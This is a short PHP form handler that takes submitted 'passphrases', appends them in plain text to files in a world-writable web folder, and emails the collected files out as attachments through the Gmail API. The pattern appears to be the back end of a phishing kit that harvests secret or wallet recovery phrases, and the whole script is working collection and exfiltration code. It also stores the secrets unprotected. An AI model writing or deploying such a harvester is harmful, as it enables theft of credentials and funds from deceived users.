<?php
require 'vendor/autoload.php';

use Google\Client;
use Google\Service\Gmail;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the submitted passphrase
    $passphrase = trim($_POST['mf-text']);

    // Check if the passphrase is not empty
    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    // Define the file path and name
    $filePath = 'submissions/';
    $fileNameJson = 'passphrases.json';
    $fileNameTxt = 'passphrases.txt';

    // Create the directory if it doesn't exist
    if (!is_dir($filePath)) {
        mkdir($filePath, 0777, true);
    }

    // Prepare the data to save
    $data = [
        'passphrase' => $passphrase,
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // Save as JSON
    $jsonData = json_encode($data) . PHP_EOL;
    file_put_contents($filePath . $fileNameJson, $jsonData, FILE_APPEND);

    // Save as plain text
    $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
    file_put_contents($filePath . $fileNameTxt, $textData, FILE_APPEND);

    // Send email with attachments
    sendEmailWithAttachments($filePath . $fileNameJson, $filePath . $fileNameTxt);

    echo "Passphrase saved and email sent successfully!";
} else {
    echo "Invalid request method.";
}

function sendEmailWithAttachments($jsonFilePath, $txtFilePath) {
    $client = new Client();
    $client->setAuthConfig('credentials.json');
    $client->addScope(Gmail::MAIL_GOOGLE_COM);

    $service = new Gmail($client);

    $message = new Gmail\Message();
    $message->setRaw(base64url_encode(createMessageWithAttachments($jsonFilePath, $txtFilePath)));

    try {
        $service->users_messages->send('me', $message);
    } catch (Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
}

function createMessageWithAttachments($jsonFilePath, $txtFilePath) {
    $boundary = uniqid(rand(), true);
    $subject = 'Passphrases File';
    $from = 'your-email@example.com';
    $to = 'your-email@example.com';

    $message = "From: $from\r\n";
    $message .= "To: $to\r\n";
    $message .= "Subject: $subject\r\n";
    $message .= "MIME-Version: 1.0\r\n";
    $message .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n\r\n";
    $message .= "--$boundary\r\n";
    $message .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
    $message .= "Attached are the passphrases in JSON and TXT format.\r\n\r\n";

    // Add JSON attachment
    $message .= "--$boundary\r\n";
    $message .= "Content-Type: application/json; name=\"passphrases.json\"\r\n";
    $message .= "Content-Disposition: attachment; filename=\"passphrases.json\"\r\n";
    $message .= "Content-Transfer-Encoding: base64\r\n\r\n";
    $message .= chunk_split(base64_encode(file_get_contents($jsonFilePath))) . "\r\n";

    // Add TXT attachment
    $message .= "--$boundary\r\n";
    $message .= "Content-Type: text/plain; name=\"passphrases.txt\"\r\n";
    $message .= "Content-Disposition: attachment; filename=\"passphrases.txt\"\r\n";
    $message .= "Content-Transfer-Encoding: base64\r\n\r\n";
    $message .= chunk_split(base64_encode(file_get_contents($txtFilePath))) . "\r\n";

    $message .= "--$boundary--";

    return $message;
}

function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
?>
